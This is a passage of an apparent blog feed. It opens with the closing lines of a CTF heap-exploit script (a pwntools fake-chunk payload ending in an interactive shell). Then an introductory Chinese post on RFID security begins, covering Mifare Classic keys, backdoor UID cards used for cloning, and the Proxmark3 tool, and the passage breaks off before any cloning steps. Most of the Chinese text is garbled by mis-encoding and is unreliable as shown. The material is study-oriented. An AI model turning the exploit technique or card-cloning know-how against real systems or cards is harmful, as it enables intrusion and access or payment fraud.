p1)</span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) <span class="comment">#size</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)    <span class="comment">#bk, for creating the &quot;bk&quot; of the faked chunk to avoid crashing when unlinking from unsorted bin</span></span><br><span class="line">p2 += p64(<span class="number">0</span>) + p64(fake_chunk-<span class="number">0x18</span>-<span class="number">5</span>)   <span class="comment">#bk_nextsize, for creating the &quot;size&quot; of the faked chunk, using misalignment tricks</span></span><br><span class="line">edit(<span class="number">8</span>, p2)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x30</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>RFID å®‰å…¨åˆæ¢</title>
    <url>/2019/03/26/RFID/</url>
    <content><![CDATA[<p>RFID ç›¸å…³å†…å®¹ã€‚</p>
<span id="more"></span>

<h2 id="RFID-ç®€ä»‹"><a href="#RFID-ç®€ä»‹" class="headerlink" title="RFID ç®€ä»‹"></a>RFID ç®€ä»‹</h2><p>RFID(Radio Frequency Identification) å…¨ç§°å°„é¢‘è¯†åˆ«æŠ€æœ¯ï¼Œè¿™ä¸ªåå­—å¤§å®¶å¯èƒ½æ¯”è¾ƒé™Œç”Ÿï¼Œä½†æ˜¯æèµ·æˆ‘ä»¬ç”Ÿæ´»ä¸­ç»å¸¸ä½¿ç”¨çš„é¥­å¡ï¼Œæ°´å¡ï¼Œé“¶è¡Œå¡ç­‰ç­‰è¿™äº›ä¸œè¥¿ï¼Œå¤§å®¶åº”è¯¥å¾ˆç†Ÿæ‚‰äº†ã€‚æˆ‘ä»¬å‡ ä¹æ¯å¤©éƒ½ä¼šä½¿ç”¨è¿™äº›å°å°çš„å¡ç‰‡ï¼Œåƒé¥­éœ€è¦ï¼Œå–é’±éœ€è¦ï¼Œç”šè‡³å›å®¶ä½¿ç”¨ç”µæ¢¯ä¹Ÿéœ€è¦ï¼Œå¯ä»¥è¯´æˆ‘ä»¬çš„ç”Ÿæ´»å·²ç»ç¦»ä¸å¼€ RFID è¿™ä¸€æŠ€æœ¯äº†ã€‚</p>
<p>é‚£ä¹ˆ RFID åˆ°åº•æ˜¯æ€æ ·çš„ä¸€é—¨æŠ€æœ¯ï¼Ÿé’ˆå¯¹å®ƒçš„æ”»é˜²åˆä¼šå¦‚ä½•å±•å¼€å‘¢ï¼Ÿè¿™æ¬¡æˆ‘ä»¬å°±æ¥ç®€å•æ¢ç´¢ä¸€ä¸‹å…³äº RFID å°„é¢‘è¯†åˆ«çš„æ”»ä¸é˜²ã€‚</p>
<p>é¦–å…ˆè¦çŸ¥é“ä»€ä¹ˆæ˜¯ RFIDï¼Œå®é™…ä¸Šå®ƒæ˜¯ä¸€ç§è‡ªåŠ¨è¯†åˆ«æŠ€æœ¯ï¼ŒåŒä¸€ç±»çš„è¿˜åŒ…æ‹¬æ¡å½¢ç è¯†åˆ«ï¼ŒOCR ç­‰ç­‰ï¼Œä¸ RFID æœ€ä¸ºç›¸å…³çš„å°±æ˜¯æ™ºèƒ½å¡(åˆç§°ä½œ<strong>ç”µå­æ ‡ç­¾</strong>)äº†ï¼Œæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­ç”¨åˆ°çš„å„ç§å¡ç‰‡å¤§å¤šæ•°éƒ½å±äºæ™ºèƒ½å¡ï¼Œå®ƒä»¬çš„æ„é€ å¾ˆç®€å•ï¼Œä»å¤–è§‚æ¥çœ‹å°±æ˜¯æ™®é€šçš„å¡‘æ–™å¡ç‰‡ï¼Œå¦‚æœæˆ‘ä»¬å°†å¡ç‰‡æ”¾åœ¨å¼ºå…‰ä¸‹ç…§å°„ï¼Œä»å¦ä¸€é¢å°±èƒ½å¤Ÿæ¸…æ™°çš„çœ‹åˆ°å¡ç‰‡å†…éƒ¨æ„é€ ï¼Œé¦–å…ˆæ˜¯å¾ˆå¤šåœˆé“œçº¿ç»•æˆçš„çº¿åœˆï¼Œè¿™ä¸ªçº¿åœˆå„ç§å½¢çŠ¶éƒ½æœ‰ï¼Œä½†æ˜¯ä»¥æ­£æ–¹å½¢ï¼Œåœ†å½¢å’Œæ¤­åœ†ä¸ºä¸»ï¼Œåœ¨çº¿åœˆä¸­å¤®å­˜åœ¨ä¸€ä¸ªéå¸¸å°çš„èŠ¯ç‰‡ï¼Œä¸€ä¸ª RFID å†…éƒ¨å¯èƒ½æ˜¯ä¸‹é¢è¿™ç§å½¢æ€</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-1.jpg"
                     
                ></p>
<p>çº¿åœˆå‘æŒ¥ç€å¤©çº¿çš„ä½œç”¨ï¼ŒèŠ¯ç‰‡ä¸­å­˜å‚¨äº†è¿™å¼ å¡çš„ä¸»è¦ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸€å¼ é¥­å¡ï¼ŒèŠ¯ç‰‡ä¸­å°±å¯èƒ½å­˜å‚¨äº†æŒå¡äººçš„å§“åå’Œ IDï¼Œè¿˜æœ‰ä½™é¢ï¼Œæ¶ˆè´¹æ—¥æœŸç­‰ç­‰å¿…è¦çš„ä¿¡æ¯ã€‚  </p>
<h3 id="é“œåœˆå¤©çº¿"><a href="#é“œåœˆå¤©çº¿" class="headerlink" title="é“œåœˆå¤©çº¿"></a>é“œåœˆå¤©çº¿</h3><p>ä¸€å¼  RFID å¡æœ€æ˜¾çœ¼çš„å°±æ˜¯é‚£ä¸€åœˆä¸€åœˆçš„å¤©çº¿ï¼Œè¿™é‡Œæ‰€è¯´çš„å¤©çº¿å¯ä¸æ˜¯ç”µè§†ä¸Šé‚£ç§å¤©çº¿ï¼Œå¡ç‰‡ä¸­çš„å¤©çº¿æ˜¯ç”¨æ¥æ¥æ”¶ RFID è¯»å¡å™¨ä¼ è¿‡æ¥çš„ä¿¡å·çš„ã€‚RFID çš„ç‰©ç†å±‚å®ç°æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ç”µç£è—•åˆï¼ŒäºŒæ˜¯ç”µç£åå°„ã€‚</p>
<p>é¦–å…ˆè¯´ä¸€è¯´ç”µç£è—•åˆï¼Œè¿™æ˜¯æ™ºèƒ½å¡éå¸¸å¸¸è§çš„ä¸€ç§ç‰©ç†å±‚å®ç°æ–¹æ³•ï¼Œæ ¹æ®ç‰©ç†ä¸­ç”µç£å­¦çš„ç›¸å…³çŸ¥è¯†ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“çš„ç†è§£å®ƒçš„åŸç†ï¼Œå¦‚ä¸‹å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-2.jpg"
                     
                ></p>
<p>è¯»å¡å™¨é€šè¿‡å®ƒçš„å¤©çº¿å‘å¤–å‘å°„ç£åœºï¼Œè¿™æ—¶å€™å¦‚æœæˆ‘ä»¬å°†å¡ç‰‡é è¿‘è¯»å¡å™¨ï¼Œæ ¹æ®ç”µç£æ„Ÿåº”å®šå¾‹ï¼Œå¡ç‰‡ä¸­çš„çº¿åœˆå°±ä¼šå‡ºç°ç”µæµï¼Œä»è€Œé©±åŠ¨æ™ºèƒ½å¡ä¸­çš„èŠ¯ç‰‡ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšâ€œæ¿€æ´»â€ã€‚</p>
<p>å½“ RFID èŠ¯ç‰‡è¢«æ¿€æ´»åï¼Œä¼šä¸»åŠ¨å‘é€åº”ç­”ä¿¡å·åˆ°è¯»å¡å™¨ï¼Œè¯»å¡å™¨æ¥å—ä¿¡å·å°†å…¶è§£ç é€å›ç”µè„‘ä¸­çš„ APP å®Œæˆè¿›ä¸€æ­¥æ“ä½œã€‚</p>
<p>ç”µç£åå°„æ–¹å¼çš„æ™ºèƒ½å¡å®Œå…¨ä¾æ‰˜è¯»å¡å™¨çš„ç”µç£ä¿¡å·ï¼Œå½“ä¿¡å·æ¥è§¦åˆ°æ™ºèƒ½å¡åï¼Œä¼šæ¿€æ´»å†…éƒ¨çš„å„ç§å…ƒä»¶ï¼Œç”Ÿæˆç›¸åº”çš„ä¿¡æ¯ï¼Œé™„åŠ åœ¨åå°„çš„ç£åœºä¸­è¿”å›è¯»å¡å™¨ã€‚</p>
<h3 id="RFID-èŠ¯ç‰‡"><a href="#RFID-èŠ¯ç‰‡" class="headerlink" title="RFID èŠ¯ç‰‡"></a>RFID èŠ¯ç‰‡</h3><p>æ™ºèƒ½å¡ä¸­çš„èŠ¯ç‰‡åŒ…å«å¾ˆå¤šç±»å‹ï¼Œä½†æ˜¯ç›®å‰ä¸»è¦çš„æœ‰ä¸¤ç§ï¼Œä¸€æ˜¯éæ¥è§¦å¼å­˜å‚¨å¡ï¼ŒäºŒæ˜¯éæ¥è§¦å¼ CPU å¡ã€‚  </p>
<p>å­˜å‚¨å¡é¡¾åæ€ä¹‰ï¼ŒèŠ¯ç‰‡ä¸­ä¿å­˜ç€å®šä¹‰å¥½çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸Šé¢æåˆ°çš„é¥­å¡ï¼Œæ°´å¡ï¼Œå®ƒä»¬ä¼šå°†æŒå¡äººçš„å„ç§ä¿¡æ¯ä¿å­˜åœ¨èŠ¯ç‰‡ä¸­ï¼Œå½“å‘ç”Ÿæ¶ˆè´¹ã€å……å€¼ç­‰è¡Œä¸ºæ—¶æ›´æ–°å¡ä¸­çš„æ•°æ®ã€‚æˆ‘ä»¬å¯ä»¥ç®€å•çš„å°†å­˜å‚¨å¡ç†è§£ä¸ºå¡ä¸­ä¿å­˜ç€ä¸€ä¸ªå¾®å‹æ•°æ®åº“ï¼Œå¹¶åœ¨ä½¿ç”¨å¡çš„æ—¶å€™å¯¹æ•°æ®åº“ä¸­çš„å€¼è¿›è¡Œæ›´æ–°ã€‚ </p>
<p>è€Œ CPU å¡çš„åŠŸèƒ½å°±æ›´åŠ å¼ºåŠ²äº†ï¼Œå¡ä¸­é™¤äº†å­˜å‚¨èŠ¯ç‰‡ï¼Œè¿˜åŒ…å«ä¸€ä¸ªå¾®å‹ CPU èŠ¯ç‰‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§å¡æœ‰ä¸€å®šçš„è¿ç®—èƒ½åŠ›ã€‚</p>
<p>RFID æ¯•ç«Ÿæ˜¯ä¾é ç”µç£æ³¢å·¥ä½œçš„ä¸€ç§è®¾å¤‡ï¼Œä¸ºäº†é¡¾åŠå…¶ä»–è¡Œä¸šçš„æ— çº¿ç”µæœåŠ¡(ä¾‹å¦‚åŒ»ç–—ã€ç§‘å­¦ç­‰)ï¼ŒRFID æœ‰ä¸€å¥—å›½é™…æ ‡å‡†ï¼Œè§„å®šäº†å®ƒçš„ä¿¡å·èŒƒå›´ï¼Œç”±æ­¤äº§ç”Ÿäº†ä¸åŒç±»å‹çš„å¡ç‰‡ã€‚é€šå¸¸ RFID ä½¿ç”¨çš„é¢‘æ®µæ˜¯ ISM é¢‘æ®µï¼Œè¿™æ˜¯ç”±å›½é™…é€šä¿¡è”ç›Ÿæ— çº¿ç”µé€šä¿¡å±€åˆ¶å®šçš„ä¸€ç§æ ‡å‡†ï¼Œåº”ç”¨è¿™äº›é¢‘æ®µæ— éœ€è·å¾—è®¸å¯è¯æˆ–è€…ç¼´çº³ä»»ä½•è´¹ç”¨ï¼Œåªæ˜¯å‘å°„åŠŸç‡ä¸èƒ½è¿‡å¤§ï¼Œä¸èƒ½å½±å“åˆ°å…¶ä»–é¢‘æ®µæ­£å¸¸çš„æ— çº¿ç”µä¸šåŠ¡ã€‚</p>
<p>é€šå¸¸ RFID ä½¿ç”¨çš„é¢‘æ®µæœ‰ 0 ~ 135kHZï¼Œ13.56mHZï¼Œä»¥åŠ 24.125GHZ ç­‰ç­‰ï¼Œå…¶ä¸­ä»¥ 125kHZ å’Œ 13.56 mHZ æœ€ä¸ºå¹¿æ³›ã€‚</p>
<p>ç”±äºé¢‘æ®µæœ‰é«˜æœ‰ä½ï¼Œ RFID åˆè¢«åˆ†ä¸ºä¸‰ç±»ï¼Œä¸€æ˜¯ä½é¢‘å¡ï¼ŒäºŒæ˜¯é«˜é¢‘å¡ï¼Œä¸‰æ˜¯è¶…é«˜é¢‘å¡ã€‚æˆ‘ä»¬å¸¸ç”¨çš„å¡ç‰‡éƒ½å±äºä½é¢‘å’Œé«˜é¢‘å¡ã€‚</p>
<h3 id="ä½é¢‘å¡"><a href="#ä½é¢‘å¡" class="headerlink" title="ä½é¢‘å¡"></a>ä½é¢‘å¡</h3><p>ä½é¢‘å¡é€šå¸¸å·¥ä½œåœ¨ 125kHZ è¿™ä¸€é¢‘æ®µï¼Œå®ƒå…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹</p>
<ol>
<li>ä¸å—æ— çº¿ç”µé¢‘ç‡çš„ç®¡æ§ã€‚</li>
<li>è¯†åˆ«è·ç¦»ä¸€èˆ¬å°äº 1mã€‚</li>
<li>é€šå¸¸åº”ç”¨åœ¨åŠ¨ç‰©è¯†åˆ«ï¼Œé—¨ç¦ï¼Œç”µå­é”ã€‚</li>
<li>å¯å­˜å‚¨çš„æ•°æ®è¾ƒå°‘ï¼Œæ•°æ®ä¼ è¾“é€Ÿåº¦è¾ƒä½ã€‚</li>
</ol>
<p>æˆ‘ä»¬ç”Ÿæ´»ä¸­æœ‰ä¸€ç§å¾ˆå¸¸è§çš„ä½é¢‘å¡ï¼Œé‚£å°±æ˜¯ç”µæ¢¯å’Œé—¨ç¦å¡ï¼Œå¡ä¸­çš„èŠ¯ç‰‡ä¸èƒ½å­˜å‚¨å¤§é‡çš„æ•°æ®ï¼Œæ‰€ä»¥è¿™äº›å¡ä¸­é€šå¸¸åªå­˜å‚¨äº†ä¸€ä¸ªä¸²å·(æˆ–è€…ç§°ä¸º ID å·)ï¼Œä»å¤–è§‚ä¸Šçœ‹ï¼Œå¡ç‰‡å‘ˆåœ†å½¢ï¼Œè“è‰²ï¼Œå¯ä»¥æŒ‚åœ¨é’¥åŒ™æ‰£ä¸Šé¢ã€‚</p>
<h3 id="é«˜é¢‘å¡"><a href="#é«˜é¢‘å¡" class="headerlink" title="é«˜é¢‘å¡"></a>é«˜é¢‘å¡</h3><p>é«˜é¢‘å¡æ¯”ä½é¢‘å¡æ›´åŠ å¸¸è§ï¼Œå…¶æœ‰å¦‚ä¸‹ç‰¹ç‚¹</p>
<ol>
<li>æ˜¯ä½¿ç”¨é‡æœ€å¤§çš„ç”µå­æ ‡ç­¾ä¹‹ä¸€ã€‚</li>
<li>æ•°æ®ä¼ è¾“é€Ÿåº¦å¾ˆå¿«ã€‚</li>
<li>æ—¶é’Ÿé¢‘ç‡é«˜ï¼Œå¯ä»¥å®ç°è¾ƒé«˜å¼ºåº¦çš„åŠ å¯†ã€‚</li>
<li>é€šå¸¸åº”ç”¨åœ¨ç”µå­è½¦ç¥¨ã€ç”µå­èº«ä»½è¯ç­‰ã€‚</li>
</ol>
<p>é«˜é¢‘å¡ä¸€èˆ¬å·¥ä½œåœ¨ 13.56mHZï¼Œè¿™ç§å¡ç‰‡ä¸åŒäºä½é¢‘å¡ï¼Œå®ƒæœ‰æ›´å¤§çš„å­˜å‚¨ç©ºé—´ï¼Œç”šè‡³å¯ä»¥åŒ…å«ä¸€å®šçš„è¿ç®—èƒ½åŠ›ï¼Œå¹¶ä¸”å¡ç‰‡å‡ºå‚è‡ªå¸¦å¯†ç ï¼Œè¿™äº›å¯†ç ç”¨æˆ·å¯ä»¥è‡ªè¡Œä¿®æ”¹ï¼Œæ‰€ä»¥ç›¸å¯¹äºä½é¢‘å¡æ¥è¯´ï¼Œé«˜é¢‘å¡è¦æ›´åŠ å®‰å…¨ã€‚</p>
<h3 id="NFC-ä¸-RFID"><a href="#NFC-ä¸-RFID" class="headerlink" title="NFC ä¸ RFID"></a>NFC ä¸ RFID</h3><p>NFC(Near Field Communication) è¿‘è·ç¦»æ— çº¿é€šè®¯æŠ€æœ¯ï¼Œæœ€åˆæ˜¯ç”±é£åˆ©æµ¦å…¬å¸å’Œç´¢å°¼å…¬å¸å…±åŒå¼€å‘çš„NFCæ˜¯ä¸€ç§éæ¥è§¦å¼è¯†åˆ«å’Œäº’è”æŠ€æœ¯ã€‚</p>
<p>NFC æ˜¯ç”± RFID æŠ€æœ¯æ¼”å˜è€Œæ¥çš„ï¼ŒNFC é¢‘æ®µä»…é™äº 13.56 mHZï¼Œè€Œ RFID çš„é¢‘æ®µè¦æ›´åŠ å¹¿æ³›ä¸€äº›ï¼Œè€Œä¸” NFC å¡çš„è¯†åˆ«è·ç¦»å¾ˆçŸ­ï¼Œå¤§å¤šåœ¨ 10 cm ä¹‹å†…ï¼Œè€Œ RFID å¡çš„è¯†åˆ«è·ç¦»å¾ˆå¹¿ï¼Œä¾‹å¦‚é«˜é€Ÿæ”¶è´¹ç«™çš„ ETC ç³»ç»Ÿï¼Œè¯†åˆ«è·ç¦»è¾¾åˆ°äº†å‡ ç±³ã€‚  </p>
<p>NFC æ›´åŠ é€‚ç”¨äºæˆ‘ä»¬çš„æ—¥å¸¸ç”Ÿæ´»é€‚ç”¨ï¼Œè€Œ RFID å¡åˆ™æ›´åŠ åå‘äºå·¥ä¸šä¸Šçš„åº”ç”¨ï¼Œä¸è¿‡å®ƒä»¬æ®Šé€”åŒå½’ï¼ŒåŸºæœ¬åŸç†éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p>
<h3 id="M1-å¡"><a href="#M1-å¡" class="headerlink" title="M1 å¡"></a>M1 å¡</h3><p>M1 å¡æŒ‡çš„æ˜¯ Mifare ç”Ÿäº§çš„ Mifare Classic å¡ï¼Œè¿™ç§å¡ç›®å‰è¿˜åº”ç”¨åœ¨å¾ˆå¤šçš„åœºæ™¯ï¼Œè¿™ç§å¡çš„åŸºæœ¬ç»“æ„å¦‚å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-3.jpg"
                     
                ></p>
<p>åœ¨ä¸€æ¬¡åˆ·å¡çš„è¿‡ç¨‹ä¸­å¡ç‰‡å’Œè¯»å¡å™¨ä¹‹é—´ä¼šäº§ç”Ÿå¾ˆå¤šä¿¡æ¯äº¤æ¢ï¼Œé’ˆå¯¹ M1 å¡æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°†åˆ·å¡æµç¨‹æ€»ç»“å¦‚ä¸‹</p>
<ol>
<li>å¡ç‰‡å¤„äºä¼‘çœ çŠ¶æ€</li>
<li>è¯»å¡å™¨å‘é€ç”µç£ä¿¡å·ï¼Œæ¿€æ´»å¡ç‰‡èŠ¯ç‰‡ã€‚æ³¨æ„åœ¨åŒä¸€æ—¶é—´å†…å¯èƒ½æœ‰å¤šå¼ å¡ç­‰å¾…å”¤é†’ã€‚</li>
<li>è¿›å…¥é˜²å†²çªå¾ªç¯ï¼Œé˜²æ­¢åŒä¸€æ—¶é—´å†…å”¤é†’å¤šå¼ å¡ç‰‡ï¼Œäº§ç”Ÿæ•°æ®è¯»å–å†²çªã€‚å½“å¯¹åº”çš„å¡ç‰‡è¢«é€‰ä¸­çš„æ—¶å€™ï¼Œå¡ç‰‡ä¼šå‘è¯»å¡å™¨å‘é€è‡ªèº«çš„å¡å·ï¼Œè¿™æ—¶æ­¤å¡ä¼šè¢«è¯»å¡å™¨é”å®šï¼Œå…¶ä»–æ²¡æœ‰è¢«é€‰ä¸­çš„å¡ç‰‡ä¼šé‡æ–°è¿›å…¥ä¼‘çœ çŠ¶æ€</li>
<li>è¯»å¡å™¨å‘é€é€‰å¡(select card)æŒ‡ä»¤ï¼Œé€‰å®šä¸Šä¸€æ­¥é”å®šçš„å¡ç‰‡ï¼Œè¿›è¡Œå¡ç‰‡è®¤è¯å’Œå­˜å‚¨å™¨çš„æ“ä½œã€‚è¢«é€‰ä¸­çš„å¡ç‰‡ä¼šè¿”å›åº”ç­”ç (ATS&#x3D; 0x8)ï¼Œå‘è¯»å¡å™¨å£°æ˜è‡ªå·±çš„ç±»å‹ã€‚</li>
<li>ä¸‰è½®è®¤è¯ï¼šè¯»å¡å™¨é€‰å®šå¡ç‰‡æ‰‡åŒºï¼Œç”¨æ‰‡åŒºä¸­çš„ä¸¤ç»„å¯†é’¥è¿›è¡Œæ•°æ®æ ¡éªŒï¼Œå¦‚æœé€šè¿‡äº†ä¸‰è½®è®¤è¯ï¼Œä¹‹åçš„æ‰€æœ‰å­˜å‚¨å™¨æ“ä½œ(è¯»å¡ã€å†™å¡)éƒ½æ˜¯åŠ å¯†çš„ã€‚</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-4.jpg"
                     
                ></p>
<p>M1 å¡çš„å­˜å‚¨å™¨åˆ†ä¸ºå¾ˆå¤šæ‰‡åŒºï¼Œè¿™äº›æ‰‡åŒºå†…ä¿å­˜ç€ä¸åŒçš„æ•°æ®ï¼Œæ¯ä¸ªæ‰‡åŒºè®¾å®šäº†ä¸¤ä¸ªå¯†é’¥(key)ï¼Œåˆ†ä¸º KEYA å’Œ KEYBï¼Œå‚è€ƒä¸‹å›¾</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/RFID-5.jpg"
                     
                ></p>
<p>å…¶ä¸­æœ€ä¸ºç‰¹æ®Šçš„æ˜¯é›¶å·æ‰‡åŒºï¼Œå®ƒæ˜¯å¡ç‰‡åˆ¶é€ å•†åœ¨å¡ç‰‡å‡ºå‚çš„æ—¶å€™è®¾å®šçš„ï¼Œä¸€èˆ¬åŒ…å«å†™ä¿æŠ¤ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸èƒ½éšæ„æ›´æ”¹ 0 å·æ‰‡åŒºçš„æ•°æ®ã€‚</p>
<p>é™¤ 0 å·æ‰‡åŒºä¹‹å¤–ï¼Œå‰©ä¸‹çš„æ‰‡åŒºç”¨æ¥å­˜å‚¨ç”¨æˆ·æ•°æ®ï¼Œæ¯ä¸ªæ‰‡åŒºæœ‰ 48 ä¸ªå­—èŠ‚å¯ä»¥ç”¨æ¥å­˜å‚¨ç”¨æˆ·æ•°æ®ï¼Œè€Œå‰©ä¸‹çš„ 16 ä¸ªå­—èŠ‚ç”¨æ¥ä¿å­˜å½“å‰æ‰‡åŒºçš„ KEYA å’Œ KEYBï¼Œä»¥åŠä¸€äº›æ§åˆ¶ä½ä¿¡æ¯ã€‚</p>
<p>æ§åˆ¶ä¿¡æ¯ç”¨æ¥æŒ‡æ˜å½“å‰æ‰‡åŒºçš„è¯»å†™æ¨¡å¼ï¼Œä¾‹å¦‚å¯ä»¥å°†å½“å‰æ‰‡åŒºæŒ‡å®šä¸ºè¯»å†™åŒºå—ï¼Œæˆ–è€…æ•°å€¼åŒºå—ç­‰ã€‚</p>
<h3 id="UIDã€CUIDã€FUID-å¡"><a href="#UIDã€CUIDã€FUID-å¡" class="headerlink" title="UIDã€CUIDã€FUID å¡"></a>UIDã€CUIDã€FUID å¡</h3><p>*UIDå¡å®é™…ä¸Šéƒ½æ˜¯ IC å¡(é«˜é¢‘å¡)çš„ä¸€ç§ï¼Œå®ƒä»¬å®Œå…¨å…¼å®¹ M1 å¡ï¼Œæ‰€ä»¥å¯ä»¥å°†å®ƒä»¬ç†è§£ä¸ºä¸€ç§ç‰¹æ®Šçš„ M1 å¡ï¼ŒUID å¡æœ‰ä¸€ä¸ªæœ‰è¶£çš„åå­—ï¼Œå«åš<strong>ä¸­å›½åé—¨å¡</strong>ï¼Œå®ƒå’Œæ™®é€šçš„ M1 å¡æœ€å¤§çš„åŒºåˆ«æ˜¯èƒ½å¤Ÿéšæ„æ”¹å†™ 0 å·æ‰‡åŒºçš„æ•°æ®ï¼Œæ‰€ä»¥ç»å¸¸è¢«ç”¨æ¥å…‹éš†å¡ç‰‡ã€‚UID å¡å­˜åœ¨ç‰¹æ®Šçš„åé—¨æŒ‡ä»¤(è¿˜æ˜¯ä¸­å›½äººå‘æ˜çš„ï¼Œæ‰€ä»¥å°±å«åšä¸­å›½åé—¨å¡)ï¼Œå¦‚æœè¯»å¡æœºæœ‰å UID å¡ç­–ç•¥ï¼Œå°±ä¼šå‘å¡ç‰‡å‘é€åé—¨æŒ‡ä»¤ï¼Œå¦‚æœå¡ç‰‡å¯¹æŒ‡ä»¤è¿›è¡Œäº†å“åº”ï¼Œè¯»å¡æœºå°±ä¼šæ‹’ç»è¿›ä¸€æ­¥çš„æ“ä½œã€‚</p>
<p>CUID å¡æ˜¯ UID çš„è¿›åŒ–ç‰ˆï¼Œå®ƒçš„åŠŸèƒ½å’Œ UID å¡ç›¸åŒä½†æ˜¯ä¸å“åº”åé—¨æŒ‡ä»¤ï¼Œæ‰€ä»¥è¢«æ£€æµ‹å‡ºæ¥çš„æ¦‚ç‡è¦æ›´å°ä¸€äº›ï¼Œå’Œ UID çš„åŒºåˆ«åœ¨äºè™½ç„¶éƒ½èƒ½å¯¹ 0 å·æ‰‡åŒºè¿›è¡Œéšæ„çš„è¯»å†™ï¼Œä½†æ˜¯ CUID è¯»å†™æ˜¯åŸºäºå¯†ç çš„ï¼Œè€Œ UID ç›´æ¥é€šè¿‡æŒ‡ä»¤è¯»å†™ã€‚</p>
<p>FUID åˆ™æ˜¯ CUID çš„è¿›åŒ–ç‰ˆï¼Œè™½ç„¶ CUID å¡ä¸å“åº”åé—¨æŒ‡ä»¤ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰è¢«æ£€æµ‹çš„å¯èƒ½ï¼Œ ä¾‹å¦‚è¯»å¡æœºå¯ä»¥é€šè¿‡å°è¯•ä¿®é›¶å·æ‰‡åŒº(ä½¿ç”¨å¯†ç )æ¥åˆ¤æ–­å¡ç‰‡æ˜¯å¦ä¸º CUID å¡ã€‚FUID ä¹Ÿå¯ä»¥å¯¹é›¶å·æ‰‡åŒºè¿›è¡Œæ”¹å†™ï¼Œä½†æ˜¯å®ƒåªèƒ½ä¿®æ”¹ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§å¡ç‰‡å‡ºå‚ä¹‹ååªæœ‰ä¸€æ¬¡ä¿®æ”¹ 0 å·æ‰‡åŒºçš„æœºä¼šï¼Œä¿®æ”¹ä¹‹å 0 å·æ‰‡åŒºä¼šè¢«é”å®šï¼Œè¿™æ—¶ FUID å¡å’Œæ™®é€šçš„ IC å¡å°±æ²¡ä»€ä¹ˆåŒºåˆ«äº†ã€‚æ˜¾ç„¶ FUID å¡æ›´éš¾è¢«æ£€æµ‹å’Œå±è”½ã€‚</p>
<h2 id="RFID-å¡ç‰‡å…‹éš†"><a href="#RFID-å¡ç‰‡å…‹éš†" class="headerlink" title="RFID å¡ç‰‡å…‹éš†"></a>RFID å¡ç‰‡å…‹éš†</h2><p><strong>æœ¬å®éªŒæ˜¯å®Œå…¨çš„æŠ€æœ¯ç ”ç©¶ï¼Œå®éªŒä¸­æ²¡æœ‰ä¿®æ”¹ä»»ä½•æ•æ„Ÿæ•°æ®ï¼</strong></p>
<p>å‰é¢è®²äº†é‚£ä¹ˆå¤šåŸºç¡€çŸ¥è¯†ï¼Œç°åœ¨å°±æ¥ä¸Šæ‰‹å®è·µä¸€ä¸‹ã€‚</p>
<h3 id="å·¥å…·å‡†å¤‡"><a href="#å·¥å…·å‡†å¤‡" class="headerlink" title="å·¥å…·å‡†å¤‡"></a>å·¥å…·å‡†å¤‡</h3><ol>
<li>å¡ç‰‡(M1 å¡ã€UID å¡)</li>
<li>è¯»å¡å™¨(å¦‚æœæœ‰)</li>
<li>ProXmark3 RFID ä¿®æ”¹å¼€å‘ç‰ˆ</li>
<li>ä¸€å°ç”µè„‘</li>
</ol>
<h3 id="ProXmark3"><a href="#ProXmark3" class="headerlink" title="ProXmark3"></a>ProXmark3</h3><p>Proxmark3æ˜¯ç”±Jonathan Westhuesè®¾è®¡å¹¶ä¸”å¼€å‘çš„å¼€æºç¡¬ä»¶ï¼Œå…¶ä¸»è¦ç”¨RFIDçš„å—…æ¢ã€è¯»å–ä»¥åŠå…‹éš†ç­‰çš„æ“ä½œã€‚æ˜¯å› ä¸ºåŸä½œè€…ä¸ºäº†ç ”ç©¶æœ‰å…³Mifare Classicç¡•å£«è®ºæ–‡è€Œç”Ÿçš„ã€‚è¿™æ¬¾å·¥å…·æå¤§åœ°é™ä½äº†ç ”ç©¶ RFID çš„é—¨æ§›ã€‚</p>
<p>ä¸è¿‡è¿™æ¬¾ç¡¬ä»¶ä»·æ ¼ä¸è²ï¼Œå…¶å®˜æ–¹å”®ä»·ä¸€åº¦è¾¾åˆ° 2000 äººæ°‘å¸ï¼Œä¸è¿‡ç”±äºå…¶å¼€æºçš„æ€§è´¨ï¼Œå›½å†…æœ‰å¾ˆå¤šå‚å®¶å¯¹ç¡¬ä»¶è¿›è¡Œäº†ä»¿åˆ¶ï¼Œç›®å‰åœ¨æ·˜å®ä¸Šå¤§æ¦‚ 300 ~ 500 å…ƒå°±å¯ä»¥å…¥æ‰‹ã€‚</p>
